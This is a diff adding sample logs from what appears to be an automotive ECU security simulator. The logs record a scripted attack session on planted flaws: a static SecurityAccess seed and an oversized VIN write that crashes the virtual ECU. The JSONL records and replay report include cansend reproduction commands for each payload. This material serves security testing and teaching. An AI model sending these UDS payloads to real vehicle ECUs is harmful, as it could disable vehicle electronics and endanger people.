@@ -1,0 +1,125 @@
+========================================================================
+  ECU Simulation logging started  —  2024-11-14 09:15:00
+========================================================================
+
+--- logs/ecu_simulation.log  (human-readable text log) ---
+--- Excerpt covering a complete VULN-001 + VULN-006 attack session ---
+
+[2024-11-14 09:15:00.042] [INF] [ecu.main                    ] [main.py:_install_excepthook:25] [SYSTEM] ECU Simulator starting up
+[2024-11-14 09:15:00.051] [INF] [ecu.main                    ] [main.py:<module>:35]             [SYSTEM] Entering Tk main loop
+[2024-11-14 09:15:00.068] [INF] [ecu.gui                     ] [gui.py:__init__:22]              [INIT] Building ECU_GUI and starting VirtualECU
+[2024-11-14 09:15:00.073] [INF] [ecu.isotp_server             ] [isotp_server.py:__init__:20]    [INIT] ISO-TP server starting — interface=vcan0 RX=0x7E0 TX=0x7E8
+[2024-11-14 09:15:00.081] [INF] [ecu.isotp_server             ] [isotp_server.py:__init__:32]    [INIT] ISO-TP stack ready — stmin=5ms blocksize=8 wftmax=2
+[2024-11-14 09:15:00.085] [DBG] [ecu.uds_core                 ] [uds_core.py:__init__:21]        [INIT] UDSCore initialised — 4 DIDs registered
+[2024-11-14 09:15:00.090] [INF] [ecu.vulnerability_engine     ] [vulnerability_engine.py:__init__:26] [INIT] VulnerabilityEngine ready — 5 of 6 vulnerabilities enabled
+[2024-11-14 09:15:00.090] [DBG] [ecu.vulnerability_engine     ] [vulnerability_engine.py:__init__:30] [INIT]   ENABLED: VULN-001 — VIN_Write_Overflow
+[2024-11-14 09:15:00.091] [DBG] [ecu.vulnerability_engine     ] [vulnerability_engine.py:__init__:30] [INIT]   ENABLED: VULN-002 — Security_Bypass_Magic_Byte
+[2024-11-14 09:15:00.091] [DBG] [ecu.vulnerability_engine     ] [vulnerability_engine.py:__init__:30] [INIT]   ENABLED: VULN-004 — ISO_TP_Segment_Overlap
+[2024-11-14 09:15:00.092] [DBG] [ecu.vulnerability_engine     ] [vulnerability_engine.py:__init__:30] [INIT]   ENABLED: VULN-005 — Diagnostic_Session_Leaking
+[2024-11-14 09:15:00.092] [DBG] [ecu.vulnerability_engine     ] [vulnerability_engine.py:__init__:30] [INIT]   ENABLED: VULN-006 — Weak_Seed_Entropy
+[2024-11-14 09:15:00.095] [INF] [ecu.virtual_ecu              ] [virtual_ecu.py:__init__:52]     [SYSTEM] VirtualECU ready — profile=Gateway_ECU_Sim vulns=6
+[2024-11-14 09:15:00.098] [INF] [ecu.virtual_ecu              ] [virtual_ecu.py:start:63]        [SYSTEM] ECU main loop starting
+
+# ──────────────────────────────────────────────────────────────────────
+# Step 1 — Attacker enters Extended Diagnostic Session (normal)
+# ──────────────────────────────────────────────────────────────────────
+[2024-11-14 09:15:04.112] [DBG] [ecu.virtual_ecu              ] [virtual_ecu.py:_handle_request:97]  [STATE] Session=DEFAULT Security=LOCKED(lvl=0) Faulted=False(-) HangUntil=0.00 | incoming SID=0x10 payload=1003
+[2024-11-14 09:15:04.113] [INF] [ecu.virtual_ecu              ] [virtual_ecu.py:_handle_request:109] [RX] SID=0x10(DiagnosticSessionControl) Payload=1003 Len=2 | PreState: Session=DEFAULT SecLvl=0 Faulted=False
+[2024-11-14 09:15:04.115] [DBG] [ecu.uds_core                 ] [uds_core.py:handle:60]           [DISPATCH] SID=0x10 → srv_10_session_control | payload=1003
+[2024-11-14 09:15:04.116] [INF] [ecu.uds_core                 ] [uds_core.py:srv_10_session_control:82] [SVC-10] Session EXTENDED — prev=0x01
+[2024-11-14 09:15:04.117] [INF] [ecu.virtual_ecu              ] [virtual_ecu.py:_log_response:163]  [TX] POSITIVE 5003003201F4
+
+# ──────────────────────────────────────────────────────────────────────
+# Step 2 — Attacker requests Security Access seed (VULN-006 triggered)
+# ──────────────────────────────────────────────────────────────────────
+[2024-11-14 09:15:04.801] [DBG] [ecu.virtual_ecu              ] [virtual_ecu.py:_handle_request:97]  [STATE] Session=EXTENDED Security=LOCKED(lvl=0) Faulted=False(-) HangUntil=0.00 | incoming SID=0x27 payload=2701
+[2024-11-14 09:15:04.802] [INF] [ecu.virtual_ecu              ] [virtual_ecu.py:_handle_request:109] [RX] SID=0x27(SecurityAccess) Payload=2701 Len=2 | PreState: Session=EXTENDED SecLvl=0 Faulted=False
+[2024-11-14 09:15:04.803] [WRN] [ecu.vulnerability_engine     ] [vulnerability_engine.py:evaluate_uds:118] [VULN] VULN-006 'Weak_Seed_Entropy' TRIGGERED | Action=MODIFY_RESPONSE | Payload=2701 | Vulnerability triggered: Sent static seed 0xDEADBEEF
+[2024-11-14 09:15:04.803] [WRN] [ecu.vulnerability_engine     ] [vulnerability_engine.py:_apply_effect:167] [EFFECT] Applying action=MODIFY_RESPONSE for VULN-006 'Weak_Seed_Entropy'
+[2024-11-14 09:15:04.804] [WRN] [ecu.vulnerability_engine     ] [vulnerability_engine.py:_apply_effect:181] [EFFECT] MODIFY_RESPONSE — static seed DEADBEEF injected
+[2024-11-14 09:15:04.804] [INF] [ecu.virtual_ecu              ] [virtual_ecu.py:_handle_request:117] [VULN-ACTION] SID=0x27 action=FORCED_RESPONSE payload=2701
+[2024-11-14 09:15:04.855] [INF] [ecu.virtual_ecu              ] [virtual_ecu.py:_log_response:163]  [TX] POSITIVE 670100DEADBEEF
+
+# ──────────────────────────────────────────────────────────────────────
+# Step 3 — Attacker writes oversized VIN payload (VULN-001 triggered → CRASH)
+# ──────────────────────────────────────────────────────────────────────
+[2024-11-14 09:15:06.302] [DBG] [ecu.virtual_ecu              ] [virtual_ecu.py:_handle_request:97]  [STATE] Session=EXTENDED Security=UNLOCKED(lvl=1) Faulted=False(-) HangUntil=0.00 | incoming SID=0x2E payload=2EF190414141414141414141414141414141414141414141
+[2024-11-14 09:15:06.303] [INF] [ecu.virtual_ecu              ] [virtual_ecu.py:_handle_request:109] [RX] SID=0x2E(WriteDataByIdentifier) Payload=2EF190...24bytes Len=24 | PreState: Session=EXTENDED SecLvl=1 Faulted=False
+[2024-11-14 09:15:06.304] [WRN] [ecu.vulnerability_engine     ] [vulnerability_engine.py:evaluate_uds:118] [VULN] VULN-001 'VIN_Write_Overflow' TRIGGERED | Action=CRASH | Payload=2EF190414141... | Memory Corruption detected in VIN buffer
+[2024-11-14 09:15:06.305] [WRN] [ecu.vulnerability_engine     ] [vulnerability_engine.py:_apply_effect:167] [EFFECT] Applying action=CRASH for VULN-001 'VIN_Write_Overflow'
+[2024-11-14 09:15:06.305] [ERR] [ecu.vulnerability_engine     ] [vulnerability_engine.py:_apply_effect:172] [EFFECT] ECU CRASH — fault_reason=VULN-001 recovery_in=5.0s
+[2024-11-14 09:15:06.306] [INF] [ecu.virtual_ecu              ] [virtual_ecu.py:_handle_request:117] [VULN-ACTION] SID=0x2E action=FAULTED payload=2EF190...
+[2024-11-14 09:15:06.306] [ERR] [ecu.virtual_ecu              ] [virtual_ecu.py:_handle_request:127] [FAILURE] Type=VULN-001 | ECU entered faulted state via vulnerability action | Payload=2EF190414141414141414141414141414141414141414141
+
+# ──────────────────────────────────────────────────────────────────────
+# ECU recovers after 5 s
+# ──────────────────────────────────────────────────────────────────────
+[2024-11-14 09:15:11.407] [INF] [ecu.virtual_ecu              ] [virtual_ecu.py:start:75]         [RECOVERY] Rebooting after fault 'VULN-001' — boot_count will be 1
+
+
+--- logs/ecu_simulation.jsonl  (machine-readable JSONL, one record per line) ---
+--- Showing the VULN-001 trigger entry in full ---
+
+{"timestamp": "2024-11-14T09:15:06.304", "level": "WARNING", "logger": "ecu.vulnerability_engine", "module": "vulnerability_engine", "function": "evaluate_uds", "line": 118, "message": "[VULN] VULN-001 'VIN_Write_Overflow' TRIGGERED | Action=CRASH | Payload=2EF190414141414141414141414141414141414141414141 | Memory Corruption detected in VIN buffer", "vuln_info": {"id": "VULN-001", "name": "VIN_Write_Overflow", "action": "CRASH", "trigger": {"sid": "0x2E", "did": "0xF190", "condition": "payload_length > 20"}, "log_message": "Memory Corruption detected in VIN buffer", "module": "uds_layer", "input_payload": "2EF190414141414141414141414141414141414141414141", "reproduce": "Send payload hex: 2EF190414141414141414141414141414141414141414141"}}
+
+{"timestamp": "2024-11-14T09:15:06.306", "level": "ERROR", "logger": "ecu.virtual_ecu", "module": "virtual_ecu", "function": "_handle_request", "line": 127, "message": "[FAILURE] Type=VULN-001 | ECU entered faulted state via vulnerability action | Payload=2EF190414141414141414141414141414141414141414141", "failure_info": {"failure_type": "VULN-001", "description": "ECU entered faulted state via vulnerability action", "input_payload": "2EF190414141414141414141414141414141414141414141", "ecu_state": {"session": "EXTENDED", "security_level": 1, "faulted": true, "fault_reason": "VULN-001"}, "reproduce_steps": ["1. Enter EXTENDED session (0x10 sub=03)", "2. Unlock security level 1", "3. Send payload: cansend vcan0 7E0#2EF190414141414141414141414141414141414141414141"]}}
+
+
+--- log_replay.py --dry-run output ---
+
+════════════════════════════════════════════════════════════════════════
+  ECU SIMULATION — FAILURE REPRODUCTION REPORT
+════════════════════════════════════════════════════════════════════════
+
+[FAILURES DETECTED]
+
+  Failure #1  [2024-11-14T09:15:06.306]
+    Type        : VULN-001
+    Description : ECU entered faulted state via vulnerability action
+    Payload     : 2EF190414141414141414141414141414141414141414141
+    ECU State   : Session=EXTENDED SecLvl=1 Faulted=True
+    Reproduce   :
+      1. Enter EXTENDED session (0x10 sub=03)
+      2. Unlock security level 1
+      3. Send payload: cansend vcan0 7E0#2EF190414141414141414141414141414141414141414141
+
+[VULNERABILITIES TRIGGERED — 2 event(s)]
+
+  Trigger #1  [2024-11-14T09:15:04.803]
+    ID          : VULN-006 — Weak_Seed_Entropy
+    Action      : MODIFY_RESPONSE
+    Module      : uds_layer
+    Payload     : 2701
+    Condition   : {'sid': '0x27', 'sub_function': '0x01'}
+    Message     : Vulnerability triggered: Sent static seed 0xDEADBEEF
+    Reproduce   : Send payload hex: 2701
+
+  Trigger #2  [2024-11-14T09:15:06.304]
+    ID          : VULN-001 — VIN_Write_Overflow
+    Action      : CRASH
+    Module      : uds_layer
+    Payload     : 2EF190414141414141414141414141414141414141414141
+    Condition   : {'sid': '0x2E', 'did': '0xF190', 'condition': 'payload_length > 20'}
+    Message     : Memory Corruption detected in VIN buffer
+    Reproduce   : Send payload hex: 2EF190414141414141414141414141414141414141414141
+
+[UDS MESSAGE REPLAY SEQUENCE — 3 request(s)]
+════════════════════════════════════════════════════════════════════════
+
+Step   1  [2024-11-14T09:15:04.113]
+  SID       : 0x10 (DiagnosticSessionControl)
+  Payload   : 1003
+  Pre-State : Session=DEFAULT SecLvl=0 Faulted=False
+  CAN cmd   : cansend vcan0 7E0#1003
+
+Step   2  [2024-11-14T09:15:04.802]
+  SID       : 0x27 (SecurityAccess)
+  Payload   : 2701
+  Pre-State : Session=EXTENDED SecLvl=0 Faulted=False
+  CAN cmd   : cansend vcan0 7E0#2701
+
+Step   3  [2024-11-14T09:15:06.303]
+  SID       : 0x2E (WriteDataByIdentifier)
+  Payload   : 2EF190414141414141414141414141414141414141414141
+  Pre-State : Session=EXTENDED SecLvl=1 Faulted=False
+  CAN cmd   : cansend vcan0 7E0#2EF190414141414141414141414141414141414141414141
